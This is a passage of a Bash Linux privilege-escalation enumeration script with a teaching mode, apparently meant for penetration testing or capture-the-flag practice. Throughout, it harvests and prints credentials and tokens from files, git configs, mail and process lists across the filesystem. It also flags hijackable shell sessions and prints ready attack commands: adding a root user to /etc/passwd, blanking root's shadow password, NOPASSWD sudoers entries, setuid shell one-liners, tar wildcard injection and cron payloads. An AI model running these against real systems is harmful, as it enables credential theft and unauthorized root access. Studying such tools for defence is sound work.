    # .env files (used by Laravel, Node.js, Rails, etc)
    info "Searching for .env files..."
    find / -name ".env" -type f -readable 2>/dev/null | head -20 | while read envfile; do
        vuln "Found .env file: $envfile"
        if grep -iE "password|secret|key|token|api" "$envfile" 2>/dev/null | head -5 | grep -q "."; then
            critical ".env file with credentials: $envfile"
            warn "Contains credentials:"
            grep -iE "password|secret|key|token|api" "$envfile" 2>/dev/null | head -5 | while read line; do
                log "  $line"
            done
        fi
    done
    
    # Node.js package.json
    info "Checking Node.js package.json files..."
    find / -name "package.json" -type f -readable 2>/dev/null | head -10 | while read pkgfile; do
        if grep -qE "password|token|secret" "$pkgfile" 2>/dev/null; then
            warn "package.json with secrets: $pkgfile"
            grep -E "password|token|secret" "$pkgfile" 2>/dev/null | head -3
        fi
        
        # Check for node_modules with known vulnerabilities
        local dir=$(dirname "$pkgfile")
        if [ -d "$dir/node_modules" ]; then
            info "Node modules at: $dir/node_modules"
            teach "Run 'npm audit' here to check for vulnerable packages"
        fi
    done
    
    # Python virtual environments
    info "Checking Python virtual environments..."
    find / -name "pyvenv.cfg" -o -name "activate" -type f 2>/dev/null | head -10 | while read venv; do
        local venvdir=$(dirname "$venv")
        info "Python venv: $venvdir"
        
        # Check for credentials in activate script
        if [ -f "$venvdir/activate" ]; then
            if grep -qE "PASSWORD|SECRET|TOKEN" "$venvdir/activate" 2>/dev/null; then
                warn "Credentials in activate script: $venvdir/activate"
            fi
        fi
    done
    
    # PHP composer.json
    info "Checking PHP composer.json files..."
    find / -name "composer.json" -type f -readable 2>/dev/null | head -10 | while read composer; do
        if grep -qE "password|token|auth" "$composer" 2>/dev/null; then
            warn "composer.json with secrets: $composer"
            grep -E "password|token|auth" "$composer" 2>/dev/null | head -3
        fi
    done
    
    # Ruby Gemfile
    info "Checking Ruby Gemfile files..."
    find / -name "Gemfile" -type f -readable 2>/dev/null | head -10 | while read gemfile; do
        info "Found Gemfile: $gemfile"
        if grep -qE "password|token" "$gemfile" 2>/dev/null; then
            warn "Gemfile contains credentials"
        fi
    done
    
    # ASP.NET configuration
    find / -name "appsettings.json" -o -name "web.config" -type f -readable 2>/dev/null | head -10 | while read config; do
        warn "Found ASP.NET config: $config"
        if grep -iE "connectionstring|password|secret" "$config" 2>/dev/null | head -3 | grep -q "."; then
            vuln "Config contains credentials!"
            grep -iE "connectionstring|password|secret" "$config" 2>/dev/null | head -3
        fi
    done
}

# === ENHANCED DATABASE CHECKS ===
enum_databases_extended() {
    section "ENHANCED DATABASE ENUMERATION"
    
    explain_concept "Database Privilege Escalation - Extended" \
        "Databases with weak configs or accessible sockets can lead to command execution or file access." \
        "Beyond default credentials, check for: UDF exploits, file read/write permissions, command execution features, socket permissions." \
        "MSSQL: xp_cmdshell for command execution\nMySQL: UDF for code execution\nPostgreSQL: COPY TO PROGRAM\nMongoDB: NoSQL injection in apps"
    
    # Enhanced MySQL checks
    if command -v mysql >/dev/null 2>&1; then
        info "Enhanced MySQL enumeration..."
        
        # Check for mysql config files with credentials
        for conf in /etc/mysql/my.cnf ~/.my.cnf /etc/my.cnf; do
            if [ -r "$conf" ]; then
                info "Found MySQL config: $conf"
                if grep -qE "password|user" "$conf" 2>/dev/null; then
                    warn "Config contains credentials:"
                    grep -E "password|user" "$conf" 2>/dev/null | grep -v "^#"
                fi
            fi
        done
        
        # Check for .mysql_history
        find /root /home -name ".mysql_history" -readable 2>/dev/null | while read hist; do
            warn "MySQL history file: $hist"
            teach "May contain passwords in CREATE USER or GRANT statements"
            if grep -iE "password|identified by" "$hist" 2>/dev/null | head -3 | grep -q "."; then
                vuln "History contains passwords!"
            fi
        done
    fi
    
    # MSSQL checks
    if command -v sqlcmd >/dev/null 2>&1; then
        info "MSSQL client (sqlcmd) is available"
        teach "MSSQL exploitation if accessible:"
        teach "  1. Enable xp_cmdshell: EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;"
        teach "  2. Execute commands: EXEC xp_cmdshell 'whoami';"
        teach "  3. Common default creds: sa/sa, sa/password"
    fi
    
    # MongoDB enhanced
    if command -v mongo >/dev/null 2>&1 || command -v mongosh >/dev/null 2>&1; then
        local mongo_cmd=$(command -v mongosh 2>/dev/null || command -v mongo 2>/dev/null)
        
        # Check if accessible without auth
        if timeout 3 $mongo_cmd --eval "db.version()" 2>/dev/null | grep -q "MongoDB"; then
            critical "MongoDB unauthenticated - Dump all databases"
            vuln "MongoDB is accessible WITHOUT authentication!"
            
            teach "MongoDB exploitation:"
            teach "  1. List databases: show dbs"
            teach "  2. Select DB: use <database>"
            teach "  3. Dump collections: db.<collection>.find()"
            teach "  4. Look for users, credentials, API keys"
            
            # Try to enumerate databases
            local dbs=$(timeout 3 $mongo_cmd --quiet --eval "db.adminCommand('listDatabases')" 2>/dev/null)
            if [ -n "$dbs" ]; then
                info "MongoDB databases found:"
                echo "$dbs" | grep -oE '"name" : "[^"]*"' | cut -d'"' -f4 | while read db; do
                    log "  - $db"
                done
            fi
        fi
    fi
    
    # Check for database dump files (exclude phpmyadmin system files)
    info "Searching for database dump files..."
    find / -name "*.sql" -o -name "*.dump" -o -name "*.bak" 2>/dev/null | \
    grep -iE "backup|dump|sql" | \
    grep -vE "phpmyadmin|dbconfig-common|/usr/share/doc" | \
    head -10 | while read dump; do
        if [ -r "$dump" ]; then
            warn "Database dump file: $dump"
            teach "May contain credentials in CREATE USER, INSERT, or comments"
        fi
    done
}

# === CI/CD PIPELINE EXPOSURE ===
enum_cicd() {
    section "CI/CD PIPELINE & SECRET EXPOSURE"
    
    explain_concept "CI/CD Secrets" \
        "CI/CD systems store credentials for deployments. Config files, environment variables, and cached credentials can be exposed." \
        "Jenkins, GitLab CI, GitHub Actions all need credentials to deploy. These are stored in config files, environment variables, or .git/config. Often readable by web server or application user." \
        "Check:\n  • .git/config (remote URLs with tokens)\n  • .gitlab-ci.yml (secret variables)\n  • Jenkinsfile (credentials)\n  • .github/workflows/*.yml"
    
    # Git configuration with tokens
    info "Checking .git/config for embedded tokens..."
    find / -name ".git" -type d 2>/dev/null | head -20 | while read gitdir; do
        if [ -r "$gitdir/config" ]; then
            if grep -E "https://.*:.*@|token" "$gitdir/config" 2>/dev/null | grep -q "."; then
                critical "Git credentials in config: $gitdir/config"
                vuln "Git config with credentials: $gitdir/config"
                grep -E "https://.*:.*@|token" "$gitdir/config" 2>/dev/null | while read line; do
                    log "  $line"
                done
                teach "Extract token and use for repository access or API calls"
            fi
        fi
        
        # Check git logs for secrets
        if [ -d "$gitdir" ]; then
            local gitroot=$(dirname "$gitdir")
            cd "$gitroot" 2>/dev/null && {
                if git log -p 2>/dev/null | grep -iE "password|secret|key" | head -5 | grep -q "."; then
                    warn "Git history contains potential secrets in: $gitroot"
                    teach "Review with: git log -p | grep -i password"
                fi
            }
        fi
    done
    
    # GitLab CI configuration
    find / -name ".gitlab-ci.yml" -type f -readable 2>/dev/null | head -10 | while read gitlab; do
        warn "GitLab CI config: $gitlab"
        if grep -iE "password|secret|token|key" "$gitlab" 2>/dev/null | grep -v "\\$" | head -3 | grep -q "."; then
            critical "Hardcoded secrets in GitLab CI: $gitlab"
            vuln "Hardcoded secrets in GitLab CI!"
            grep -iE "password|secret|token|key" "$gitlab" 2>/dev/null | grep -v "\\$" | head -3
        fi
        teach "Even if using variables, check GitLab runner cache for exposed secrets"
    done
    
    # GitHub Actions
    find / -name ".github" -type d 2>/dev/null | head -10 | while read ghdir; do
        if [ -d "$ghdir/workflows" ]; then
            info "GitHub Actions workflows: $ghdir/workflows"
            find "$ghdir/workflows" -name "*.yml" -o -name "*.yaml" | while read workflow; do
                if grep -iE "password|secret|token" "$workflow" 2>/dev/null | grep -v "secrets\\." | grep -q "."; then
                    warn "Potential hardcoded secret in: $workflow"
                fi
            done
        fi
    done
    
    # Jenkins
    if [ -d /var/lib/jenkins ] || [ -d /var/jenkins_home ]; then
        warn "Jenkins directory detected"
        teach "Jenkins exploitation:"
        teach "  • credentials.xml contains encrypted credentials"
        teach "  • secrets/ directory has master key"
        teach "  • jobs/*/config.xml may have plaintext tokens"
        teach "  • If you can access Jenkins web, use Script Console for RCE"
        
        # Check for readable Jenkins credentials
        find /var/lib/jenkins /var/jenkins_home -name "credentials.xml" -readable 2>/dev/null | while read creds; do
            critical "Readable Jenkins credentials: $creds"
            vuln "Readable Jenkins credentials: $creds"
        done
    fi
    
    # Docker registry credentials
    for dockerconf in ~/.docker/config.json /root/.docker/config.json; do
        if [ -r "$dockerconf" ]; then
            vuln "Docker config with registry credentials: $dockerconf"
            teach "Contains auth tokens for Docker registries"
            teach "Decode with: cat $dockerconf | jq -r '.auths[].auth' | base64 -d"
        fi
    done
}

# ═══════════════════════════════════════════════════
# END PHASE 1 ADDITIONS
# ═══════════════════════════════════════════════════

# === PROCESS MONITORING ===
enum_processes() {
    section "RUNNING PROCESSES ANALYSIS"
    
    explain_concept "Process Monitoring" \
        "Other users' processes may contain credentials in command line arguments or environment variables." \
        "Many admins run scripts with hardcoded passwords visible in 'ps aux'. Cron jobs pass credentials as arguments. Services load API keys from environment." \
        "Monitor with: watch -n 1 'ps aux'\nLook for: mysql -p, curl -u, ssh user@host, API tokens"
    
    info "Current processes (checking for credentials in command line):"
    ps aux | grep -iE "password|passwd|pwd|token|key|secret|api" | grep -v "grep" | head -10 | while read line; do
        warn "Potentially sensitive process: $line"
    done
    
    # Check for tmux/screen sessions
    if command -v tmux >/dev/null 2>&1; then
        local sessions=$(tmux ls 2>/dev/null | wc -l)
        if [ $sessions -gt 0 ]; then
            critical "Active tmux sessions - Attach to steal active shells"
            vuln "Active tmux sessions found!"
            teach "Try attaching: tmux attach -t <session>"
            teach "May get access to other user's shell"
            tmux ls 2>/dev/null
        fi
    fi
    
    if command -v screen >/dev/null 2>&1; then
        screen -ls 2>/dev/null | grep -q Detached && {
            critical "Detached screen sessions - Attach to hijack shells"
            vuln "Detached screen sessions found!"
            teach "Try attaching: screen -r"
            screen -ls 2>/dev/null
        }
    fi
}

# === MAIL & LOGS ===
enum_mail_logs() {
    section "MAIL SPOOL & LOG ANALYSIS"
    
    explain_concept "Mail & Logs" \
        "Mail spools often contain credentials, password reset tokens, or sensitive information. Logs may reveal user behavior and secrets." \
        "Users receive system notifications via mail. Password resets, admin messages, application errors all go to mail. Logs capture authentication attempts, application errors with credentials." \
        "Check:\n  /var/mail/*\n  /var/spool/mail/*\n  ~/.mail\n  /var/log/auth.log (failed SSH attempts)\n  Application logs"
    
    # Check mail spools
    for maildir in /var/mail /var/spool/mail; do
        if [ -d "$maildir" ]; then
            find "$maildir" -type f -readable 2>/dev/null | while read mail; do
                vuln "Readable mail spool: $mail"
                teach "Read with: cat $mail | less"
                if grep -iE "password|token|reset" "$mail" 2>/dev/null | head -3 | grep -q "."; then
                    critical "Mail contains passwords/tokens: $mail"
                    warn "Mail contains password-related content!"
                fi
            done
        fi
    done
    
    # Check home directory mail
    find /home -name ".mail" -o -name "mail" -o -name "mbox" 2>/dev/null | while read mail; do
        [ -r "$mail" ] && info "Found mail file: $mail"
    done
    
    # Check auth logs for interesting info
    if [ -r /var/log/auth.log ]; then
        info "Checking auth.log for failed authentication attempts..."
        grep "Failed password" /var/log/auth.log 2>/dev/null | tail -5 | while read line; do
            log "  $line"
        done
        teach "Failed attempts reveal valid usernames"
    fi
}

# === BACKUP FILES ===
enum_backups() {
    section "BACKUP FILE DISCOVERY"
    
    explain_concept "Backup Files" \
        "Backup files often contain old configurations with credentials or reveal file structure." \
        "Admins create backups before changes. These backups may have weaker permissions or old credentials that still work. Common patterns: .bak, .old, .backup, ~, .swp, .save" \
        "Where to look:\n  /var/backups\n  /tmp/*.bak\n  /opt/*.old\n  Web roots with .bak files"
    
    info "Searching for backup files..."
    
    # System backups
    if [ -d /var/backups ]; then
        find /var/backups -type f -readable 2>/dev/null | head -10 | while read backup; do
            info "System backup: $backup"
            if echo "$backup" | grep -qE "passwd|shadow|group"; then
                critical "Authentication file backup: $backup"
                vuln "Authentication file backup found: $backup"
            fi
        done
    fi
    
    # Application backups
    for pattern in "*.bak" "*.backup" "*.old" "*~"; do
        find /var/www /opt /home -name "$pattern" -type f -readable 2>/dev/null | head -10 | while read backup; do
            warn "Backup file: $backup"
            
            # Check if it's a database dump
            if echo "$backup" | grep -qE "\.sql|dump"; then
                vuln "Database backup found: $backup"
                teach "May contain credentials in CREATE USER or INSERT statements"
            fi
        done
    done
    
    # Vim swap files (may contain unsaved work)
    find /root /home -name ".*.swp" -o -name ".*.swo" 2>/dev/null | while read swap; do
        [ -r "$swap" ] && warn "Vim swap file: $swap (may contain unsaved edits)"
    done
}

# === KERNEL MODULES ===
enum_kernel_modules() {
    section "LOADED KERNEL MODULES"
    
    explain_concept "Kernel Modules" \
        "Custom or vulnerable kernel modules can be exploited for privilege escalation." \
        "Modules extend kernel functionality. Custom modules may have vulnerabilities. Some modules (like vboxdrv) have known privilege escalation paths." \
        "Check lsmod output for unusual modules, then search for module_name + CVE"
    
    info "Loaded kernel modules:"
    lsmod | head -15
    
    # Check for interesting modules
    if lsmod | grep -qE "vboxdrv|vmware"; then
        warn "Virtualization modules detected"
        teach "Check for VM escape vulnerabilities"
    fi
    
    # Check for writable module directory
    if [ -w /lib/modules/$(uname -r) ]; then
        critical "Kernel module directory WRITABLE - Load malicious modules"
        vuln "Kernel module directory is WRITABLE!"
        teach "You can load malicious kernel modules"
        teach "  Create malicious .ko file and: insmod malicious.ko"
    fi
}

# === APPARMOR / SELINUX ===
enum_mac() {
    section "MANDATORY ACCESS CONTROL (MAC)"
    
    explain_concept "AppArmor & SELinux" \
        "MAC systems add another layer of access control beyond standard Unix permissions." \
        "Even if you have root, MAC can prevent certain actions. However, if MAC is disabled or in permissive mode, it's not protecting anything." \
        "Check status and consider if it's blocking your exploitation attempts"
        # Check AppArmor
    if command -v aa-status >/dev/null 2>&1; then
        local aa_status=$(aa-status 2>/dev/null | grep "apparmor module is loaded" )
        if [ -n "$aa_status" ]; then
            warn "AppArmor is active"
            teach "May restrict exploitation of certain binaries"
            teach "Check confined processes: aa-status"
        else
            ok "AppArmor is not active"
        fi
    fi
    
    # Check SELinux
    if command -v getenforce >/dev/null 2>&1; then
        local se_status=$(getenforce 2>/dev/null)
        case "$se_status" in
            Enforcing)
                warn "SELinux is in Enforcing mode"
                teach "Will block many exploitation attempts"
                ;;
            Permissive)
                info "SELinux is in Permissive mode (logs but doesn't block)"
                ;;
            Disabled)
                ok "SELinux is disabled"
                ;;
        esac
    fi
}

# === MOUNTED FILESYSTEMS ===
enum_mounts() {
    section "MOUNTED FILESYSTEMS"
    
    explain_concept "Mount Points" \
        "Unusual mounts may reveal NFS shares, sensitive directories, or container volumes." \
        "Network mounts (NFS, CIFS) may be writable from network. Bind mounts can expose sensitive directories. Docker volumes may contain application data." \
        "Look for: NFS mounts, /dev/sd* mounts in unusual places, tmpfs in weird locations"
    
    info "Current mounts:"
    mount | grep -vE "^(proc|sys|cgroup|devpts|tmpfs on /(dev|run|sys))" | while read line; do
        log "  $line"
        
        # Check for NFS
        if echo "$line" | grep -q "type nfs"; then
            warn "NFS mount detected: $line"
            teach "Check if writable and accessible from your attack machine"
        fi
        
        # Check for unusual tmpfs
        if echo "$line" | grep -q "tmpfs on /mnt\|tmpfs on /opt"; then
            warn "Unusual tmpfs mount: $line"
        fi
    done
    
    # Check /etc/fstab for auto-mounts
    if [ -r /etc/fstab ]; then
        info "Checking /etc/fstab for interesting mounts..."
        grep -vE "^#|^$" /etc/fstab | grep -E "nfs|cifs|smb" | while read line; do
            warn "Network filesystem in fstab: $line"
        done
    fi
}

# === SCHEDULED TASKS (AT/BATCH) ===
enum_scheduled() {
    section "SCHEDULED TASKS (AT/BATCH)"
    
    explain_concept "AT & BATCH Jobs" \
        "Besides cron, 'at' and 'batch' schedule one-time tasks. May be writable or reveal information." \
        "The 'at' command schedules one-time job execution. If job files are writable or contain sensitive commands, they can be exploited." \
        "Check: atq (list jobs), at -c <job_id> (view job contents)"
    
    if command -v atq >/dev/null 2>&1; then
        local at_jobs=$(atq 2>/dev/null | wc -l)
        if [ $at_jobs -gt 0 ]; then
            info "Found $at_jobs scheduled 'at' jobs"
            atq 2>/dev/null | while read line; do
                log "  $line"
            done
            teach "View job contents: at -c <job_number>"
        fi
    fi
    
    # Check at job directory
    if [ -d /var/spool/cron/atjobs ]; then
        find /var/spool/cron/atjobs -type f -readable 2>/dev/null | while read job; do
            warn "Readable at job: $job"
        done
    fi
}

# === WORLD-WRITABLE DIRECTORIES ===
enum_world_writable() {
    section "WORLD-WRITABLE DIRECTORIES"
    
    explain_concept "World-Writable Locations" \
        "Directories writable by everyone can be used for exploitation staging, privilege escalation via cron, or PATH hijacking." \
        "If a cron job or SUID binary accesses files in world-writable directories, you can replace those files with malicious versions." \
        "Common targets: /tmp, /var/tmp, /dev/shm"
    
    info "World-writable directories in sensitive locations:"
    find / -path /proc -prune -o -path /sys -prune -o -type d -perm -0002 -ls 2>/dev/null | head -20 | while read line; do
        local dir=$(echo "$line" | awk '{print $NF}')
        case "$dir" in
            /tmp|/var/tmp|/dev/shm)
                ok "Expected writable: $dir"
                ;;
            *)
                warn "Unusual world-writable: $dir"
                ;;
        esac
    done
}

# === CLIPBOARD & SCREEN CONTENT ===
enum_clipboard() {
    section "CLIPBOARD & SCREEN CONTENT"
    
    explain_concept "Clipboard & Screenshots" \
        "Clipboard may contain passwords. Screenshot tools or framebuffer access can capture what users are viewing." \
        "Users copy/paste passwords. GUI applications store clipboard in X11 selections. Framebuffer (/dev/fb0) contains current screen content." \
        "Check:\n  xclip -o (X11 clipboard)\n  cat /dev/fb0 > /tmp/screen.raw (framebuffer)\n  Requires video group or X11 access"
    
    # Check for X11 display
    if [ -n "$DISPLAY" ]; then
        info "X11 display detected: $DISPLAY"
        
        if command -v xclip >/dev/null 2>&1; then
            local clip=$(xclip -o 2>/dev/null)
            if [ -n "$clip" ]; then
                warn "Clipboard content available"
                teach "Read with: xclip -o"
            fi
        fi
        
        if command -v xdotool >/dev/null 2>&1; then
            info "xdotool available - can simulate keypresses and capture keystrokes"
        fi
    fi
    
    # Check framebuffer access
    if [ -r /dev/fb0 ]; then
        critical "Framebuffer readable - Capture screenshots of user activity"
        vuln "Framebuffer is readable!"
        teach "Capture screen: cat /dev/fb0 > /tmp/screen.raw"
        teach "Convert with ffmpeg to view: ffmpeg -f fbdev -i /dev/fb0 screenshot.png"
    fi
}

# === FILE PERMISSIONS ===
enum_writable_files() {
    section "WRITABLE SENSITIVE FILES"
    
    explain_concept "Critical File Permissions" \
        "Certain files control system authentication and authorization. If writable, you can modify system behavior to gain root." \
        "Linux relies on file permissions to separate privileged operations. Misconfigured permissions break this security model. This happens from bad scripts, sloppy admins, or intentional misconfigurations for debugging." \
        "Always check: /etc/passwd, /etc/shadow, /etc/sudoers, cron files, systemd services, and any root-owned scripts."
    
    # Check /etc/passwd
    if [ -w /etc/passwd ]; then
        critical "WRITABLE /etc/passwd - Add root user: echo 'hacker:\$1\$xyz\$HASH:0:0::/root:/bin/bash' >> /etc/passwd"
        vuln "/etc/passwd is WRITABLE!"
        explain_concept "Writable /etc/passwd" \
            "This file maps usernames to UIDs and stores login information. UID 0 = root. You can add a new root user or change existing UIDs." \
            "Originally /etc/passwd stored password hashes (hence the name). Modern systems use /etc/shadow for hashes, but /etc/passwd still controls UIDs, home directories, and login shells. Root-equivalent = UID 0." \
            "Exploitation:\n  1. Generate password hash: openssl passwd -1 -salt xyz password123\n  2. Add root user: echo 'hacker:\$1\$xyz\$HASH:0:0::/root:/bin/bash' >> /etc/passwd\n  3. Login: su hacker\n  4. Or modify existing user's UID to 0"
    else
        ok "/etc/passwd is not writable (as expected)"
    fi
    
    # Check /etc/shadow
    if [ -w /etc/shadow ]; then
        critical "WRITABLE /etc/shadow - Remove root password: sed -i 's/^root:[^:]*:/root::/' /etc/shadow"
        vuln "/etc/shadow is WRITABLE!"
        explain_concept "Writable /etc/shadow" \
            "This file stores password hashes. Write access means you control authentication." \
            "After /etc/passwd vulnerability became known, Linux moved password hashes to /etc/shadow (only readable by root). If writable, you bypass all password security." \
            "Exploitation:\n  1. Remove root's password: sed -i 's/^root:[^:]*:/root::/' /etc/shadow\n  2. Then: su root (no password needed)\n  3. Or replace with known hash"
    else
        ok "/etc/shadow is not writable (as expected)"
    fi
    
    # Check /etc/sudoers
    if [ -w /etc/sudoers ]; then
        critical "WRITABLE /etc/sudoers - Add yourself: echo '$(whoami) ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers"
        vuln "/etc/sudoers is WRITABLE!"
        teach "This file controls sudo permissions. Direct root access:"
        teach "  echo '\$(whoami) ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers"
        teach "  sudo /bin/bash"
    else
        ok "/etc/sudoers is not writable (as expected)"
    fi
    
    # Check sudoers.d directory
    if [ -w /etc/sudoers.d ]; then
        critical "WRITABLE /etc/sudoers.d/ - Create sudo rule file"
        vuln "/etc/sudoers.d/ directory is WRITABLE!"
        teach "Create a new sudoers file here:"
        teach "  echo '\$(whoami) ALL=(ALL) NOPASSWD: ALL' > /etc/sudoers.d/pwn"
    fi
}

# === CAPABILITIES ===
enum_capabilities() {
    section "LINUX CAPABILITIES"
    
    explain_concept "Linux Capabilities" \
        "Capabilities split root's power into 38 distinct units. A binary can have specific root-like powers without full root access." \
        "Example: CAP_NET_BIND_SERVICE allows binding to ports <1024. CAP_SETUID allows changing user IDs. This is more granular than SUID, but CAP_SETUID+CAP_DAC_OVERRIDE = effectively root. Created to avoid giving full SUID root for simple tasks." \
        "Dangerous capabilities:\n  • cap_setuid = can become any user including root\n  • cap_dac_override = bypass file permission checks\n  • cap_dac_read_search = read any file\n  • cap_sys_admin = broad admin powers\n  • cap_sys_ptrace = debug any process (inject code)"
    
    local caps_found=0
    
    getcap -r / 2>/dev/null | while read line; do
        local bin=$(echo "$line" | awk '{print $1}')
        local caps=$(echo "$line" | awk '{print $3}')
        
        if echo "$caps" | grep -q "cap_setuid"; then
            critical "CAP_SETUID on $bin - Become root immediately"
            vuln "CAP_SETUID found: $bin"
            caps_found=1
            
            teach "This binary can change UIDs via setuid() syscall. Exploitation:"
            
            local basename=$(basename "$bin")
            case $basename in
                python*|python)
                    teach "  $bin -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'"
                    ;;
                perl)
                    teach "  $bin -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/sh\";'"
                    ;;
                ruby)
                    teach "  $bin -e 'Process::Sys.setuid(0); exec \"/bin/sh\"'"
                    ;;
                php)
                    teach "  $bin -r 'posix_setuid(0); system(\"/bin/sh\");'"
                    ;;
                node)
                    teach "  $bin -e 'process.setuid(0); require(\"child_process\").spawn(\"/bin/sh\", {stdio: [0,1,2]})'"
                    ;;
                *)
                    teach "  Research how $basename can call setuid(0)"
                    teach "  Or use GDB to call setuid manually if binary is scriptable"
                    ;;
            esac
        fi
        
        if echo "$caps" | grep -q "cap_dac_read_search"; then
            critical "CAP_DAC_READ_SEARCH on $bin - Read /etc/shadow and SSH keys"
            vuln "CAP_DAC_READ_SEARCH found: $bin"
            teach "This binary can bypass file read permission checks"
            teach "  Use it to read /etc/shadow, SSH keys, /root/.bash_history"
            teach "  Example: tar -cf /tmp/shadow.tar /etc/shadow"
        fi
        
        if echo "$caps" | grep -q "cap_dac_override"; then
            critical "CAP_DAC_OVERRIDE on $bin - Write to any file including /etc/passwd"
            vuln "CAP_DAC_OVERRIDE found: $bin"
            teach "This binary can bypass ALL file permission checks (read+write)"
            teach "  Write to /etc/passwd, /etc/shadow, or any protected file"
        fi
        
        if echo "$caps" | grep -q "cap_sys_ptrace"; then
            vuln "CAP_SYS_PTRACE found: $bin"
            teach "This binary can debug (attach to) any process"
            teach "  Attach to root process, inject shellcode or call system()"
        fi
        
        if echo "$caps" | grep -q "cap_sys_admin"; then
            critical "CAP_SYS_ADMIN on $bin - Nearly equivalent to root"
            vuln "CAP_SYS_ADMIN found: $bin"
            teach "This capability is extremely broad - almost equivalent to root"
            teach "  Can mount filesystems, load kernel modules, and more"
        fi
    done
    
    if [ $caps_found -eq 0 ]; then
        ok "No dangerous capabilities found"
    fi
}

# === CRON JOBS ===
enum_cron() {
    section "CRON JOB ANALYSIS"
    
    explain_concept "Cron Jobs" \
        "Cron runs scheduled tasks as different users. If a root cron job calls a script you can write to, or uses wildcards unsafely, you control what root executes." \
        "Admins create cron jobs for backups, maintenance, monitoring. Common mistakes: writable script files, relative paths, wildcard abuse (tar * can be exploited with --checkpoint-action)." \
        "Attack vectors:\n  1. Writable script called by cron\n  2. Script in writable directory\n  3. Wildcard injection (tar *, rsync *)\n  4. PATH hijacking in cron environment"
    
    # Check system crontab
    if [ -r /etc/crontab ]; then
        info "System crontab contents:"
        grep -v "^#" /etc/crontab 2>/dev/null | grep -v "^$" | while read line; do
            log "  $line"
            
            # Extract script paths
            local script=$(echo "$line" | grep -oE '/[^ ]+\.(sh|py|pl|rb)')
            if [ -n "$script" ]; then
                if [ -w "$script" ]; then
                    critical "Writable cron script: $script - Inject payload for root execution"
                    vuln "Cron script is WRITABLE: $script"
                    teach "Inject payload: echo 'chmod u+s /bin/bash' >> $script"
                elif [ -w "$(dirname "$script")" ]; then
                    critical "Cron script directory writable: $(dirname "$script")"
                    vuln "Cron script directory is WRITABLE: $(dirname "$script")"
                    teach "Replace the script or create a symlink"
                fi
            fi
            
            # Check for wildcards (but exclude safe commands like run-parts)
            if echo "$line" | grep -qE '\*' && ! echo "$line" | grep -qE 'run-parts'; then
                warn "Cron job uses wildcards - potential for injection"
                teach "If command is 'tar -czf backup.tar.gz *', you can:"
                teach "  touch -- '--checkpoint=1'"
                teach "  touch -- '--checkpoint-action=exec=sh shell.sh'"
                teach "  When tar runs, it interprets these as arguments"
            fi
        done
    fi
    
    # Check user crontabs
    for user in $(cut -d: -f1 /etc/passwd); do
        crontab -l -u "$user" 2>/dev/null | grep -v "^#" | grep -v "^$" | while read line; do
            info "User $user cron: $line"
        done
    done
    
    # Check cron directories
    for dir in /etc/cron.d /etc/cron.daily /etc/cron.hourly /etc/cron.weekly /etc/cron.monthly; do
        if [ -w "$dir" ]; then
            critical "Cron directory WRITABLE: $dir - Place malicious cron job"
            vuln "Cron directory is WRITABLE: $dir"
            teach "Create malicious cron job in this directory"
        fi
        
        if [ -d "$dir" ]; then
            find "$dir" -type f -writable 2>/dev/null | while read file; do
                critical "Writable cron file: $file"
                vuln "Writable cron file: $file"
            done
        fi
    done
}

# === KERNEL EXPLOITS ===
enum_kernel() {
    section "KERNEL EXPLOIT DETECTION"
    
    local kernel=$(uname -r)
    local kernel_version=$(echo "$kernel" | grep -oE '^[0-9]+\.[0-9]+\.[0-9]+')
    
    info "Kernel version: $kernel"
    info "Kernel numeric: $kernel_version"
    
    explain_concept "Kernel Exploits" \
        "The kernel is the core of Linux, managing hardware, processes, and security. Vulnerabilities here affect all users and often give instant root." \
        "Kernel bugs are constantly found. Older kernels have known exploitable CVEs. Patching requires reboot so admins delay it. Containers often share host kernel, making kernel exploits valuable. Most exploits require compiling C code." \
        "Process:\n  1. Check kernel version: uname -r\n  2. Search exploit-db.com or GitHub\n  3. Compile exploit on similar system\n  4. Transfer and run\n  5. Common: DirtyCOW, Dirty Pipe, PwnKit, nf_tables"
    
    # Parse version for comparison
    local major=$(echo "$kernel_version" | cut -d. -f1)
    local minor=$(echo "$kernel_version" | cut -d. -f2)
    local patch=$(echo "$kernel_version" | cut -d. -f3)
    
    # Check for specific CVEs
    if [ "$major" -eq 5 ] && [ "$minor" -ge 8 ] && [ "$minor" -le 16 ]; then
        critical "Kernel vulnerable to Dirty Pipe (CVE-2022-0847) - Instant root"
        vuln "Potentially vulnerable to Dirty Pipe (CVE-2022-0847)"
        explain_concept "Dirty Pipe" \
            "Allows overwriting data in read-only files by exploiting pipe buffer handling." \
            "Kernel versions 5.8-5.16.11 vulnerable. Allows modifying files you can't write to. Typically used to overwrite /etc/passwd to add root user." \
            "Exploit:\n  1. Download: github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits\n  2. Compile: gcc exploit.c -o exploit\n  3. Run: ./exploit\n  4. Creates root user or SUID /bin/bash"
    fi
    
    if [ "$major" -eq 5 ] && [ "$minor" -ge 14 ] && [ "$minor" -le 18 ]; then
        vuln "Potentially vulnerable to nf_tables (CVE-2024-1086)"
        teach "Requires CONFIG_USER_NS=y and nftables support"
        teach "  Check: grep CONFIG_USER_NS /boot/config-\$(uname -r)"
        teach "  Exploit: github.com/Notselwyn/CVE-2024-1086"
        teach "  Complex UAF exploit, needs compilation"
    fi
    
    if [ "$major" -eq 4 ]; then
        vuln "Kernel 4.x - Multiple known exploits available"
        teach "Search for specific version on exploit-db.com"
        
        if [ "$minor" -le 10 ]; then
            critical "Kernel vulnerable to DirtyCOW (CVE-2016-5195) - Instant root"
            vuln "Potentially vulnerable to DirtyCOW (CVE-2016-5195)"
            teach "Classic race condition in memory management"
            teach "  Exploit: github.com/firefart/dirtycow"
            teach "  Creates user 'firefart' with UID 0"
        fi
    fi
    
    info "For comprehensive kernel exploit search:"
    info "  https://github.com/mzet-/linux-exploit-suggester"
    info "  https://github.com/jondonas/linux-exploit-suggester-2"
}

# === PATH HIJACKING ===
enum_path() {
    section "PATH HIJACKING OPPORTUNITIES"
    
    explain_concept "PATH Hijacking" \
        "Programs can call commands using relative paths (e.g., 'ls' instead of '/bin/ls'). The shell searches \$PATH directories in order. If you control an early PATH directory, you control what gets executed." \
        "Lazy coding + SUID binaries = exploitable. Admins write scripts that call 'cat' or 'whoami' without full paths. If that script is SUID or run by cron as root, and you can create a malicious binary earlier in PATH, you win." \
